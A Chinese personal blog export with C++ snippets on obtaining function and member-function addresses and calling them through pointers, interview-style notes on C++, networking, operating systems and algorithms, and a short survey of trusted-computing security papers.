    <url>/2021/06/08/%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%B9%B6%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="最简单的直接测试"><a href="#最简单的直接测试" class="headerlink" title="最简单的直接测试"></a>最简单的直接测试</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;DONE!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; test &lt;&lt; endl;</span><br><span class="line">    <span class="built_in"><span class="keyword">void</span></span> (*myCALL)();</span><br><span class="line">    myCALL = test;</span><br><span class="line">    (*myCALL)();</span><br><span class="line">    cout &lt;&lt; *myCALL &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="从数组中获取地址并调用"><a href="#从数组中获取地址并调用" class="headerlink" title="从数组中获取地址并调用"></a>从数组中获取地址并调用</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;DONE!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callFunc</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">void</span></span> (*pro)();</span><br><span class="line">    pro = (<span class="built_in"><span class="keyword">void</span></span> (*)()) x;</span><br><span class="line">    (*pro)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; address;</span><br><span class="line">    address.<span class="built_in">push_back</span>(<span class="built_in"><span class="keyword">int</span></span>(test));</span><br><span class="line">    cout &lt;&lt; test &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">callFunc</span>(address[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="获取类成员函数地址并调用-1"><a href="#获取类成员函数地址并调用-1" class="headerlink" title="获取类成员函数地址并调用$^{1}$"></a>获取类成员函数地址并调用$^{1}$</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fn</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;myCallFunc is Done~&quot;</span> &lt;&lt; endl; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> dst_type, <span class="keyword">typename</span> src_type&gt;</span></span><br><span class="line"><span class="function">dst_type <span class="title">pointer_cast</span><span class="params">(src_type src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">static_cast</span>&lt;dst_type*&gt;(<span class="keyword">static_cast</span>&lt;<span class="keyword">void</span>*&gt;(&amp;src));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getAddress</span><span class="params">(<span class="keyword">decltype</span> (&amp;A::fn) x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* ptr = pointer_cast&lt;<span class="keyword">void</span>*&gt;(x);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">long</span>)ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callFunc</span><span class="params">(<span class="keyword">long</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">void</span></span> (*pro)();</span><br><span class="line">    pro = (<span class="built_in"><span class="keyword">void</span></span>(*)()) x;</span><br><span class="line">    (*pro)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> address = <span class="built_in">getAddress</span>(&amp;A::fn);</span><br><span class="line">    <span class="built_in">callFunc</span>(address);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="对应的函数模板与使用方法"><a href="#对应的函数模板与使用方法" class="headerlink" title="对应的函数模板与使用方法"></a>对应的函数模板与使用方法</h3><h4 id="getAddress"><a href="#getAddress" class="headerlink" title="getAddress"></a>getAddress</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> dst_type, <span class="keyword">typename</span> src_type&gt;</span></span><br><span class="line"><span class="function">dst_type <span class="title">getAddress</span><span class="params">(src_type x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* ptr = pointer_cast&lt;<span class="keyword">void</span>*&gt;(x);</span><br><span class="line">    <span class="keyword">return</span> (dst_type)ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> address = (<span class="keyword">long</span>)getAddress&lt;<span class="keyword">void</span>*&gt;(&amp;FuncFlowT::funcA);</span><br></pre></td></tr></table></figure>
<h4 id="callFunc"><a href="#callFunc" class="headerlink" title="callFunc"></a>callFunc</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> src_type&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callFunc</span><span class="params">(src_type x)</span> </span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">void</span></span> (*pro)();</span><br><span class="line">    pro = (<span class="built_in"><span class="keyword">void</span></span>(*)()) x;</span><br><span class="line">    (*pro)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">callFunc&lt;<span class="keyword">long</span>&gt;(address);</span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><p><a href="https://www.cnblogs.com/memset/p/get_member_function_address_cpp.html">https://www.cnblogs.com/memset/p/get_member_function_address_cpp.html</a></p>
</li>
<li><p><a href="https://bbs.csdn.net/topics/80149694">https://bbs.csdn.net/topics/80149694</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机基础综合常见理论问题</title>
    <url>/2021/08/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%BB%BC%E5%90%88%E5%B8%B8%E8%A7%81%E7%90%86%E8%AE%BA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><h3 id="strcpy和memcpy的区别"><a href="#strcpy和memcpy的区别" class="headerlink" title="strcpy和memcpy的区别"></a>strcpy和memcpy的区别</h3><p>​    1、复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。<br>​    2、复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。<br>​    3、用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy</p>
<h3 id="重载、重写、隐藏的区别"><a href="#重载、重写、隐藏的区别" class="headerlink" title="重载、重写、隐藏的区别"></a>重载、重写、隐藏的区别</h3><p>参考 <a href="https://www.cnblogs.com/evenleee/p/10933793.html">重载、重写和隐藏三者的区别 - evenleo - 博客园 (cnblogs.com)</a></p>
<p><img src="/2021/08/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%BB%BC%E5%90%88%E5%B8%B8%E8%A7%81%E7%90%86%E8%AE%BA%E9%97%AE%E9%A2%98/image-20210910140758340.png" alt="image-20210910140758340"></p>
<h3 id="指针和引用的区别"><a href="#指针和引用的区别" class="headerlink" title="指针和引用的区别"></a>指针和引用的区别</h3><div class="table-container">
<table>
<thead>
<tr>
<th>指针</th>
<th>引用</th>
</tr>
</thead>
<tbody>
<tr>
<td>存的是一个地址</td>
<td>是原变量的别名</td>
</tr>
<tr>
<td>可以有多级</td>
<td>只有一级</td>
</tr>
<tr>
<td>可以为空</td>
<td>不能为NULL且在定义时必须初始化</td>
</tr>
<tr>
<td>在初始化后可以改变指向</td>
<td>在初始化之后不可再改变</td>
</tr>
<tr>
<td>sizeof指针得到的是本指针的大小</td>
<td>sizeof引用得到的是引用所指向变量的大小</td>
</tr>
<tr>
<td>声明和 定义可以分开，可以先只声明指针变量而不初始化，等用到时再指向具体变量</td>
<td>在声明时必须初始化为另一变量</td>
</tr>
</tbody>
</table>
</div>
<h3 id="new和malloc的区别"><a href="#new和malloc的区别" class="headerlink" title="new和malloc的区别"></a>new和malloc的区别</h3><div class="table-container">
<table>
<thead>
<tr>
<th>new</th>
<th>malloc</th>
</tr>
</thead>
<tbody>
<tr>
<td>运算符，不重载</td>
<td>标准库函数，支持覆盖</td>
</tr>
<tr>
<td>除了分配，还会调用构造函数和析构函数</td>
<td>仅仅分配内存空间</td>
</tr>
<tr>
<td>返回的是具体类型指针</td>
<td>void类型指针</td>
</tr>
<tr>
<td>自动计算要分配的空间大小</td>
<td>需要手工计算</td>
</tr>
</tbody>
</table>
</div>
<h3 id="inline函数和宏定义的区别"><a href="#inline函数和宏定义的区别" class="headerlink" title="inline函数和宏定义的区别"></a>inline函数和宏定义的区别</h3><p><img src="/2021/08/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%BB%BC%E5%90%88%E5%B8%B8%E8%A7%81%E7%90%86%E8%AE%BA%E9%97%AE%E9%A2%98/image-20210820163118618.png" alt="image-20210820163118618"></p>
<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><h4 id="C-多态分类及实现："><a href="#C-多态分类及实现：" class="headerlink" title="C++ 多态分类及实现："></a>C++ 多态分类及实现：</h4><ol>
<li>重载多态（Ad-hoc Polymorphism，编译期）：函数重载、运算符重载</li>
<li>子类型多态（Subtype Polymorphism，运行期）：虚函数</li>
<li>参数多态性（Parametric Polymorphism，编译期）：类模板、函数模板</li>
<li>强制多态（Coercion Polymorphism，编译期/运行期）：基本类型转换、自定义类型转换</li>
</ol>
<h4 id="静态多态（编译期-早绑定）"><a href="#静态多态（编译期-早绑定）" class="headerlink" title="静态多态（编译期/早绑定）"></a>静态多态（编译期/早绑定）</h4><p>函数重载</p>
<h4 id="动态多态（运行期期-晚绑定）"><a href="#动态多态（运行期期-晚绑定）" class="headerlink" title="动态多态（运行期期/晚绑定）"></a>动态多态（运行期期/晚绑定）</h4><ul>
<li>虚函数：用 virtual 修饰成员函数，使其成为虚函数</li>
<li>动态绑定：当使用基类的引用或指针调用一个虚函数时将发生动态绑定</li>
</ul>
<h4 id="虚函数实现多态的原理"><a href="#虚函数实现多态的原理" class="headerlink" title="虚函数实现多态的原理"></a>虚函数实现多态的原理</h4><p>（1）编译器在发现基类中有虚函数时，会自动为每个含有虚函数的类生成一份虚表，该表是一个一维 数组，虚表里保存了虚函数的入口地址 </p>
<p>（2）编译器会在每个对象的前四个字节中保存一个虚表指针，即vptr，指向对象所属类的虚表。在构 造时，根据对象的类型去初始化虚指针vptr，从而让vptr指向正确的虚表，从而在调用虚函数时，能找到 正确的函数 </p>
<p>（3）所谓的合适时机，在派生类定义对象时，程序运行会自动调用构造函数，在构造函数中创建虚表 并对虚表初始化。在构造子类对象时，会先调用父类的构造函数，此时，编译器只“看到了”父类，并为 父类对象初始化虚表指针，令它指向父类的虚表；当调用子类的构造函数时，为子类对象初始化虚表指 针，令它指向子类的虚表</p>
<p> （4）当派生类对基类的虚函数没有重写时，派生类的虚表指针指向的是基类的虚表；当派生类对基类 的虚函数重写时，派生类的虚表指针指向的是自身的虚表；当派生类中有自己的虚函数时，在自己的虚 表中将此虚函数地址添加在后面 这样指向派生类的基类指针在运行时，就可以根据派生类对虚函数重写情况动态的进行调用，从而实现 多态性。</p>
<h3 id="构造函数与析构函数的区别"><a href="#构造函数与析构函数的区别" class="headerlink" title="构造函数与析构函数的区别"></a>构造函数与析构函数的区别</h3><ol>
<li>构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。特别的一个类可以有多个构造函数 ，可根据其参数个数的不同或参数类型的不同来区分它们 即构造函数的重载。</li>
<li>析构函数(destructor) 与构造函数相反，当对象脱离其作用域时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做“清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）</li>
</ol>
<h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><p>参考 <a href="https://www.cnblogs.com/xiaolincoding/p/11437231.html">https://www.cnblogs.com/xiaolincoding/p/11437231.html</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">////////////////////////// 饿汉实现 /////////////////////</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 获取单实例</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> Singleton* <span class="title">GetInstance</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放单实例，进程退出时调用</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deleteInstance</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印实例地址</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Print</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 将其构造和析构成为私有的, 禁止外部构造和析构</span></span><br><span class="line">    <span class="built_in">Singleton</span>();</span><br><span class="line">    ~<span class="built_in">Singleton</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将其拷贝构造和赋值构造成为私有函数, 禁止外部拷贝和赋值</span></span><br><span class="line">    <span class="built_in">Singleton</span>(<span class="keyword">const</span> Singleton &amp;signal);</span><br><span class="line">    <span class="keyword">const</span> Singleton &amp;<span class="keyword">operator</span>=(<span class="keyword">const</span> Singleton &amp;signal);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 唯一单实例对象指针</span></span><br><span class="line">    <span class="keyword">static</span> Singleton *g_pSingleton;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代码一运行就初始化创建实例 ，本身就线程安全</span></span><br><span class="line">Singleton* Singleton::g_pSingleton = <span class="built_in"><span class="keyword">new</span></span> (std::nothrow) Singleton;</span><br><span class="line"></span><br><span class="line"><span class="function">Singleton* <span class="title">Singleton::GetInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> g_pSingleton;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Singleton::deleteInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pSingleton)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">delete</span> g_pSingleton;</span><br><span class="line">        g_pSingleton = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Singleton::Print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;我的实例内存地址是:&quot;</span> &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Singleton::<span class="built_in">Singleton</span>()</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;构造函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Singleton::~<span class="built_in">Singleton</span>()</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;析构函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////// 饿汉实现 /////////////////////</span></span><br></pre></td></tr></table></figure>
<h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><h3 id="TCP与UDP的区别"><a href="#TCP与UDP的区别" class="headerlink" title="TCP与UDP的区别"></a>TCP与UDP的区别</h3><div class="table-container">
<table>
<thead>
<tr>
<th>TCP</th>
<th>UDP</th>
</tr>
</thead>
<tbody>
<tr>
<td>面向连接</td>
<td>无连接的</td>
</tr>
<tr>
<td>提供可靠的服务</td>
<td>UDP尽最大努力交付</td>
</tr>
<tr>
<td>面向字节流</td>
<td>面向报文</td>
</tr>
<tr>
<td>有拥塞控制</td>
<td>没有拥塞控制</td>
</tr>
<tr>
<td>TCP连接只能是点到点的</td>
<td>UDP支持一对一，一对多，多对一和多对多的交互通信</td>
</tr>
<tr>
<td>TCP首部开销20字节</td>
<td>UDP的首部开销只有8个字节</td>
</tr>
</tbody>
</table>
</div>
<h3 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h3><p><img src="/2021/08/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%BB%BC%E5%90%88%E5%B8%B8%E8%A7%81%E7%90%86%E8%AE%BA%E9%97%AE%E9%A2%98/image-20210820110104796.png" alt="image-20210820110104796"></p>
<h3 id="TCP四次挥手"><a href="#TCP四次挥手" class="headerlink" title="TCP四次挥手"></a>TCP四次挥手</h3><p><img src="/2021/08/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%BB%BC%E5%90%88%E5%B8%B8%E8%A7%81%E7%90%86%E8%AE%BA%E9%97%AE%E9%A2%98/image-20210820110017508.png" alt="image-20210820110017508"></p>
<h3 id="TCP如何实现可靠传输"><a href="#TCP如何实现可靠传输" class="headerlink" title="TCP如何实现可靠传输"></a>TCP如何实现可靠传输</h3><p><img src="/2021/08/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%BB%BC%E5%90%88%E5%B8%B8%E8%A7%81%E7%90%86%E8%AE%BA%E9%97%AE%E9%A2%98/image-20210819232117290.png" alt="image-20210819232117290"></p>
<h3 id="计算机网络模型"><a href="#计算机网络模型" class="headerlink" title="计算机网络模型"></a>计算机网络模型</h3><p><img src="/2021/08/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%BB%BC%E5%90%88%E5%B8%B8%E8%A7%81%E7%90%86%E8%AE%BA%E9%97%AE%E9%A2%98/image-20210820103407379.png" alt="image-20210820103407379" style="zoom:67%;"></p>
<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h3><div class="table-container">
<table>
<thead>
<tr>
<th>进程</th>
<th>线程</th>
</tr>
</thead>
<tbody>
<tr>
<td>资源分配基本单位</td>
<td>资源调度的基本单位</td>
</tr>
<tr>
<td>有自己的独立地址空间</td>
<td>共享所属进程的地址空间</td>
</tr>
<tr>
<td>在进程切换时，涉及存储器管理方面的操作，开销比线程大</td>
<td></td>
</tr>
<tr>
<td></td>
<td>线程依赖进程而存在</td>
</tr>
<tr>
<td>进程是拥有系统资源的一个独立单位</td>
<td>线程自己基本上不拥有系统资源，只有一点在运行中必不可少的资源(如程序计数器,一组寄存器和栈)</td>
</tr>
</tbody>
</table>
</div>
<h3 id="堆和栈的区别"><a href="#堆和栈的区别" class="headerlink" title="堆和栈的区别"></a>堆和栈的区别</h3><div class="table-container">
<table>
<thead>
<tr>
<th>堆</th>
<th>栈</th>
</tr>
</thead>
<tbody>
<tr>
<td>由开发者控制</td>
<td>编译器自动管理</td>
</tr>
<tr>
<td>堆内存可以达到4G的空间</td>
<td>默认的栈空间大小是1-2M</td>
</tr>
<tr>
<td>堆频繁new/delete会产生大量碎片（重点是如何解决？如内存池、伙伴系统等）</td>
<td>不存在碎片问题</td>
</tr>
<tr>
<td>堆向上生长（向着内存地址增加的方向）</td>
<td>栈向下生长（向着内存地址减小的方向增长）</td>
</tr>
<tr>
<td>堆都是动态分配的</td>
<td>静态分配和动态分配</td>
</tr>
<tr>
<td></td>
<td>栈是机器系统提供的数据结构，计算机会在底层对栈提供支持，效率更高</td>
</tr>
</tbody>
</table>
</div>
<h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>多个并发进程中，每个进程持有某种资源又等待其他进程释放它们现在保持着的资源，没改变这个状态之前不能向前推进，这组进程就产生了死锁。</p>
<h4 id="处理方法"><a href="#处理方法" class="headerlink" title="处理方法"></a>处理方法</h4><ul>
<li><p>鸵鸟策略</p>
<ul>
<li>死锁影响不大，或者概率很低，可以忽略死锁的情况。</li>
</ul>
</li>
<li><p>死锁预防 （破坏产生死锁的四个条件）</p>
<ul>
<li>破坏互斥：允许某些资源被多个进程同时访问</li>
<li>破坏占有并等待：资源预先分配，或者申请资源前先释放占有的资源</li>
<li>破坏非抢占：允许强制抢占</li>
<li>破坏循环等待条件：对所有资源同一编号，所有进程对资源的请求按序号递增的顺序提出</li>
</ul>
</li>
<li><p>死锁避免</p>
<ul>
<li><strong>银行家算法</strong>：动态检测资源分配状态，处于安全状态才能进行资源分配。（<strong>安全状态：</strong>即使所有进程突然请求所需的资源，也能存在某种资源分配顺序，让每一个进程运行完毕）</li>
</ul>
</li>
<li><p>死锁解除</p>
<ul>
<li>利用抢占：挂起进程并抢占其资源（要避免挂起时间过长而饥饿）</li>
<li>利用回滚：让某些进程回退到可以解除死锁的情况，自动释放资源</li>
<li>杀死某些进程知道死锁解除</li>
</ul>
</li>
<li><p>死锁的检测</p>
<ul>
<li>检查有向图是否存在环</li>
<li>使用类似死锁避免的检测算法</li>
</ul>
</li>
</ul>
<h3 id="线程是越多越好吗"><a href="#线程是越多越好吗" class="headerlink" title="线程是越多越好吗"></a>线程是越多越好吗</h3><p>$最佳线程数 = CPU核心数 <em> (1/CPU利用率) = CPU核心数 </em> (1 + (I/O耗时/CPU耗时))$</p>
<h2 id="算法与数据结构"><a href="#算法与数据结构" class="headerlink" title="算法与数据结构"></a>算法与数据结构</h2><h3 id="B树和B-树的区别（B树是一种平衡多路搜索树）"><a href="#B树和B-树的区别（B树是一种平衡多路搜索树）" class="headerlink" title="B树和B+树的区别（B树是一种平衡多路搜索树）"></a>B树和B+树的区别（B树是一种平衡多路搜索树）</h3><p>B+树中只有叶子节点会带有指向记录的指针（ROWID），换句话说，就是非叶子节点不会带上 ROWID，一个块中可以容纳更多的索引项，可以降低树的高度；B树所有节点都带有</p>
<p>B+树中所有叶子节点都通过指针连接在一起，范围扫描性能要好一点；B树不会，B树需要在叶子节点和内部节点之间不停地移动。</p>
<h4 id="B树的应用场景"><a href="#B树的应用场景" class="headerlink" title="B树的应用场景"></a>B树的应用场景</h4><p>文件系统和数据库</p>
<h3 id="（了解哪些算法）冒泡排序，选择排序，快排"><a href="#（了解哪些算法）冒泡排序，选择排序，快排" class="headerlink" title="（了解哪些算法）冒泡排序，选择排序，快排"></a>（了解哪些算法）冒泡排序，选择排序，快排</h3><p><strong>冒泡：</strong>比较相邻的元素。升序的话就是，如果第一个比第二个大，就交换位置</p>
<p><strong>选择：</strong>最开始在未排序的序列里面找到最小元素，存放到排序序列的起始位置，然后，再从未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推</p>
<p><strong>快排：</strong>随机挑一个数作基准，小于基准的放在前，大于基准的放在后。把序列分为较小区和较大区，再分别对小数与大区进行排序。</p>
<p><strong>归并排序：</strong>把数据分为两段，从两段中逐个选最小的元素移入新数据段的末尾。可从上到下或从下到上进行。</p>
<p><strong>堆排：</strong>从堆顶把根卸出来放在有序区之前，再恢复堆。</p>
<h3 id="双向链表插入节点"><a href="#双向链表插入节点" class="headerlink" title="双向链表插入节点"></a>双向链表插入节点</h3><p><a href="http://www.360doc.com/content/17/0427/12/30427643_649056362.shtml">http://www.360doc.com/content/17/0427/12/30427643_649056362.shtml</a></p>
<p><img src="/2021/08/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%BB%BC%E5%90%88%E5%B8%B8%E8%A7%81%E7%90%86%E8%AE%BA%E9%97%AE%E9%A2%98/image-20210819231749802.png" alt="image-20210819231749802"></p>
<h3 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h3><p>任一节点对应的两棵子树的最大高度差为1</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>计算机理论</tag>
      </tags>
  </entry>
  <entry>
    <title>近期文献调研</title>
    <url>/2021/08/15/%E8%BF%91%E6%9C%9F%E6%96%87%E7%8C%AE%E8%B0%83%E7%A0%94/</url>
    <content><![CDATA[<h2 id="Trusted-Computing"><a href="#Trusted-Computing" class="headerlink" title="Trusted Computing"></a>Trusted Computing</h2><h3 id="2020-Design-of-Terminal-Security-Access-Scheme-based-on-Trusted-Computing-in-Ubiquitous-Electric-Internet-of-Things"><a href="#2020-Design-of-Terminal-Security-Access-Scheme-based-on-Trusted-Computing-in-Ubiquitous-Electric-Internet-of-Things" class="headerlink" title="2020 Design of Terminal Security Access Scheme based on Trusted Computing in Ubiquitous Electric Internet of Things"></a>2020 Design of Terminal Security Access Scheme based on Trusted Computing in Ubiquitous Electric Internet of Things</h3><p><a href="https://ieeexplore.ieee.org/document/9339022">https://ieeexplore.ieee.org/document/9339022</a> </p>
<p>基于电气物联网中可信计算的终端安全访问方案设计</p>
<p>keywords: ubiquitous electric internet of things,trusted computing,terminal access,secure access</p>
<p>Guodong Wang proposed a dual-system design scheme for terminal active immunity based on trusted computing. In this scheme, the terminal node in UEIoT is composed of two parts: computing part and trusted protection part. The computing component and the trusted protection component are logically independent of each other, forming a trusted computing active immune dual-system structure with both computing and protection functions. The Trusted Network Connection extends the trusted state of the terminal to the network, thus providing a solution for terminal secure access in the UEIoT.<br>They proposed a dual-system scheme for terminal active immunity based on trusted computing. In this scheme, the terminal node is composed of two parts: computing part and trusted protection part. The trusted protection part relies on the cryptographic services provided by TCM and the active measurement and control functions provided by TPCM to realize the chain of trust to be passed forward in the form of active adjudication. It can overcome the defects caused by the mounting method and passive invocation of TPM component in the traditional TCG and form a dual-system active security protection architecture with the existing security system in the host computing system. </p>
<p>这篇文章很符合预期，既有可信计算，又涉及终端安全。</p>
<p>作者希望构建具有计算和保护功能的可信计算-主动免疫双系统结构。</p>
<h3 id="2020-Security-of-Edge-Computing-Based-on-Trusted-Computing"><a href="#2020-Security-of-Edge-Computing-Based-on-Trusted-Computing" class="headerlink" title="2020 Security of Edge Computing Based on Trusted Computing"></a>2020 Security of Edge Computing Based on Trusted Computing</h3><p><a href="https://ieeexplore.ieee.org/document/9265904/metrics#metrics">https://ieeexplore.ieee.org/document/9265904/metrics#metrics</a></p>
<p>基于可信计算的边缘计算安全</p>
<p>This paper mainly analyzes the threats faced by edge computing and the current security architecture, and puts forward a protection mechanism based on trust and cooperates with blockchain technology to improve the security and reliability of edge computing. If a separate security framework for edge computing can be proposed according to this article, it will play a role in the healthy development of edge computing.</p>
